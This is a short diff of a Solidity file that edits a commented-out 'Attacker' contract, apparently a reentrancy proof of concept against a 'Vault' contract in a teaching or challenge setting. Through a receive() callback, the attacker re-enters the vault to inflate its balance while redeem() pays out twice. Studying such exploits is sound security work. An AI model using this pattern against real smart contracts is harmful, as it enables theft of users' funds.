@@ -68,21 +68,26 @@ contract Vault {
 
 // contract Attacker {
 //     Vault public immutable vault;
-//     C public immutable c;
+//     C_ree public immutable c;
+//     bool flag = true;
 
-//     constructor(address _vault, address payable _c) {
+//     constructor(address _vault, address payable _c) payable {
 //         vault = Vault(_vault);
-//         c = C(_c);
+//         c = C_ree(_c);
 //     }
 
 //     function attack() public {
-//         c.redeem(payable(msg.sender));
-//         c.redeem(payable(msg.sender));  // the second redeem() will pay 1000
+//         (bool success,) = address(c).call{value: 1 ether}("");
+//         require(success);
+//         c.redeem(payable(address(this)));
+//         c.redeem(payable(address(this)));  // the second redeem() will pay 1000
 //     }
 
 //     receive() external payable {
-//         vault.increase(msg.sender, 1000);
+//         if (flag) {
+//             flag = false;
+//             vault.increase(address(this), 2 ether);
+//         }
 //     }
 
 // }
-
